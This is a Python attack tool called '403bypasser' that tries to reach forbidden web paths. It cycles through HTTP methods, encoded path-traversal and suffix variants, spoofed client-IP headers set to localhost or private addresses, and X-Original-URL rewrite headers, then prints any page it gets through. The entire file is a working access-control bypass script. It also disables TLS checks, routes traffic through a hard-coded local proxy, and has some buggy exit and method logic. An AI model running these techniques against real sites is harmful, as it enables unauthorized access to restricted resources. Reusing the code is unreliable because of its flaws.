
import requests, sys, argparse, validators, os, tldextract
from colorama import init, Fore, Style
from pyfiglet import Figlet

requests.packages.urllib3.disable_warnings()
methods = ["GET","POST","PUT","TRACE","GUFF"]
ctypes = ["","application/x-www-form-urlencoded","application/json"]
# INITIALISE COLORAMA
init()

# DISPLAY BANNER -- START
custom_fig = Figlet(font='slant')
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('-------------') + Style.RESET_ALL)
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('403bypasser') + Style.RESET_ALL)
print(Fore.GREEN + Style.BRIGHT + "____________________ Yunus Emre SERT ____________________\n")
print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "-----> Twitter   : https://twitter.com/yunem_se\n")
print(Fore.MAGENTA + Style.BRIGHT + "-----> GitHub    : https://github.com/yunemse48\n")
print(Fore.MAGENTA + Style.BRIGHT + "-----> LinkedIn  : https://www.linkedin.com/in/yunus-emre-sert-9102a9135/\n")
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('-------------') + Style.RESET_ALL)
# DISPLAY BANNER -- END

# HANDLE ARGUMENTS -- START
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", type=str, help="single URL to scan, ex: http://example.com")
parser.add_argument("-U", "--urllist", type=str, help="path to list of URLs, ex: urllist.txt")
parser.add_argument("-d", "--dir", type=str, help="Single directory to scan, ex: /admin", nargs="?", const="/")
parser.add_argument("-D", "--dirlist", type=str, help="path to list of directories, ex: dirlist.txt")

args = parser.parse_args()
# HANDLE ARGUMENTS -- END



class Arguments():
    def __init__(self, url, urllist, dir, dirlist):
        self.url = url
        self.urllist = urllist
        self.dir = dir
        self.dirlist = dirlist
        self.urls = []
        self.dirs = []
        
        self.checkURL()
        self.checkDir()
    
    def return_urls(self):
        return self.urls
    
    def return_dirs(self):
        return self.dirs
    
    def checkURL(self):
        if self.url:
            if not validators.url(self.url):
                print("You must specify a valid URL for -u (--url) argument! Exitting...\n")
                sys.exit
            
            if self.url.endswith("/"):
                self.url = self.url.rstrip("/")
            
            self.urls.append(self.url)
        elif self.urllist:
            if not os.path.exists(self.urllist):
                print("The specified path to URL list does not exist! Exitting...\n")
                sys.exit()
            
            with open(self.urllist, 'r') as read:
                temp = read.read().splitlines()
            
            for x in temp:
                self.urls.append(x.strip())
        else:
            print("Please provide a single URL or a list either! (-u or -U)\n")
            sys.exit()
    
    def checkDir(self):
        if self.dir:
            if not self.dir.startswith("/"): 
                self.dir = "/" + self.dir
            
            if self.dir.endswith("/") and self.dir != "/":
                self.dir = self.dir.rstrip("/")
            self.dirs.append(self.dir)
        elif self.dirlist:
            if not os.path.exists(self.dirlist):
                print("The specified path to directory list does not exist! Exitting...\n")
                sys.exit()
            
            with open(self.dirlist, 'r') as read:
                temp = read.read().splitlines()
            
            for x in temp:
                self.dirs.append(x.strip())
        else:
            self.dir = "/"
            self.dirs.append(self.dir)


class PathRepository():
    def __init__(self, path):
        self.path = path
        self.newPaths = []
        self.newHeaders = []
        self.rewriteHeaders = []
        
        self.createNewPaths()
        self.createNewHeaders()
    
    def createNewPaths(self):
        self.newPaths.append(self.path)
        
        pairs = [["/", "//"], ["/.", "/./"]]
        
        leadings = ["/%2e","/.","/%2f","/%252e"]
        
        trailings = ["/", ";","..;/", "../", "\\","\.","\\..\\.\\",".././","..\\","..%ff/",
                     "%2e%2e%2f",".%2e/","..%00/", "..%0d/","..%5c","..%2f","/..;/", 
                     "%20", "%09", "%00", ".json", ".css", ".html", "?", "??", "???", "%3f",
                    "?testparam", "#", "#test", "/.","/*","/*/","/./.","/./","/nonexisting/..","nonexisting/..",
                     "/nonexisting/%252e%252e","nonexisting/%252e%252e",
                     '"',"'","';",'";','");',"');",'"]',')]}','&',"%26",'%',"%23","%25"]
        
        for pair in pairs:
            self.newPaths.append(pair[0] + self.path + pair[1])
        
        for leading in leadings:
            self.newPaths.append(leading + self.path)
        
        for trailing in trailings:
            self.newPaths.append(self.path + trailing)
    
    def createNewHeaders(self):
        headers_overwrite = ["X-Original-URL", "X-Rewrite-URL"]
        
        headers = ["X-Custom-IP-Authorization", "X-Forwarded-For", 
                "X-Forward-For", "X-Remote-IP", "X-Originating-IP", 
                "X-Remote-Addr", "X-Client-IP", "X-Real-IP"]
        
        values = ["localhost", "localhost:80", "localhost:443", 
                "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", 
                "2130706433", "0x7F000001", "0177.0000.0000.0001", 
                "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", 
                "172.16.0.1", "192.168.1.0", "192.168.1.1"]
        
        for header in headers:
            for value in values:
                self.newHeaders.append({header : value})
        
        for element in headers_overwrite:
            self.rewriteHeaders.append({element : self.path})


class Query():
    def __init__(self, url, dir, dirObject):
        self.url = url
        self.dir = dir          # call pathrepo by this
        self.dirObject = dirObject
        self.domain = tldextract.extract(self.url).domain
    
    
    
    def checkStatusCode(self, status_code):
        if status_code == 200 or status_code == 201:
            colour = Fore.GREEN + Style.BRIGHT
        elif status_code == 301 or status_code == 302:
            colour = Fore.BLUE + Style.BRIGHT
        elif status_code == 403 or status_code == 404:
            colour = Fore.MAGENTA + Style.BRIGHT
        elif status_code == 500:
            colour = Fore.RED + Style.BRIGHT
        else:
            colour = Fore.WHITE + Style.BRIGHT
        
        return colour
    
    def writeToFile(self, array):
        with open(self.domain + ".txt", "a") as file:
            for line in array:
                file.write(line + "\n")
                
    def buildrequest(self,url,headers={},body="",method="GET",ctype=""):
        if method == "GET" and method != "GUFF":
            req = requests.Request(method=method, url=url, headers=headers)
        else:
            req = requests.Request(method=method, url=url, data={}, headers=headers)
        prep = req.prepare()
        prep.url = url
        if method == "GET" and method != "GUFF":
            prep.body = body
            prep.headers['Content-Length'] = str(len(body))
            if ctype != "":
                prep.headers['Content-Type'] = ctype
        r = None
        with requests.Session() as s1:
            r = s1.send(prep, verify=False,allow_redirects=False,proxies={"http":"127.0.0.1:8080","https":"127.0.0.1:8080"})
            if r.status_code == 200:
                print(url+" : "+method+" : "+ctype)
                print(headers)
                print("------------------------------------------------------------")
                print(r.text)
                print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
        return r
        
    def manipulateRequest(self,method,ctype=""):
        print(("Target URL: " + self.url + "          "+"Target Path: " + self.dir + " ").center(50, "="))
        print("=======================================================================")
        results = []
        p = self.buildrequest(url=self.url + self.dir,method=method,ctype=ctype)
        
        colour = self.checkStatusCode(p.status_code)
        reset = Style.RESET_ALL
        target_address = method+" --> " + self.url + self.dir
        info = f"STATUS: {colour}{p.status_code}{reset}\tSIZE: {len(p.content)}"
        info_pure = f"STATUS: {p.status_code}\tSIZE: {len(p.content)}"
        
        print( target_address + "          " + info)
        if ctype != "":
            print("Content-Type: "+ctype)
        
        results.append(target_address + "          " + info_pure)
        
        self.writeToFile(results)
    
    def manipulatePath(self,method,ctype=""):
        results = []
        reset = Style.RESET_ALL
        
        for path in self.dirObject.newPaths:
            r = self.buildrequest(url=self.url + path,method=method,ctype=ctype)
            
            colour = self.checkStatusCode(r.status_code)
            
            target_address = method+" --> " + self.url + path
            info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
            info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
            
            print(target_address + " " * 10 + info)
            if ctype != "":
                print("Content-Type: "+ctype)
            
            results.append(target_address + " " * 10 + info_pure)
        
        self.writeToFile(results)
    
    def manipulateHeaders(self,method,ctype=""):
        results = []
        
        for header in self.dirObject.newHeaders:
            r = self.buildrequest(url=self.url + self.dir,method=method,headers=header,ctype=ctype)
            
            colour = self.checkStatusCode(r.status_code)
            reset = Style.RESET_ALL
            
            target_address = method+" --> " + self.url + self.dir
            info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
            info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
            if ctype != "":
                print("Content-Type: "+ctype)
            
            print("\n" + target_address + " " * 10 + info)
            print(f"Header= {header}")
            
            results.append("\n" + target_address + " " * 10 + info_pure + f"\nHeader= {header}")
        self.writeToFile(results)
        
        results_2 = []
        for header in self.dirObject.rewriteHeaders:
            r = self.buildrequest(url=self.url, headers=header,method=method,ctype=ctype)
            
            colour = self.checkStatusCode(r.status_code)
            reset = Style.RESET_ALL
            
            target_address = method+" --> " + self.url
            info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
            info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
            if ctype != "":
                print("Content-Type: "+ctype)
            
            print("\n" + target_address + " " * 10 + info)
            print(f"Header= {header}")
            
            results_2.append("\n" + target_address + " " * 10 + info_pure + f"\nHeader= {header}")
        
        self.writeToFile(results_2)


class Program():
    def __init__(self, urllist, dirlist):
        self.urllist = urllist
        self.dirlist = dirlist
    
    def initialise(self):
        for u in self.urllist:
            for d in self.dirlist:
                for method in methods:
                    for ctype in ctypes:
                        if d != "/":
                            dir_objname = d.lstrip("/")
                        else:
                            dir_objname = "_rootPath"
                        locals()[dir_objname] = PathRepository(d)
                        domain_name = tldextract.extract(u).domain
                        locals()[domain_name] = Query(u, d, locals()[dir_objname])
                        locals()[domain_name].manipulateRequest(method=method,ctype=ctype)
                        locals()[domain_name].manipulatePath(method=method,ctype=ctype)
                        locals()[domain_name].manipulateHeaders(method=method,ctype=ctype)

argument = Arguments(args.url, args.urllist, args.dir, args.dirlist)
program = Program(argument.return_urls(), argument.return_dirs())

program.initialise()
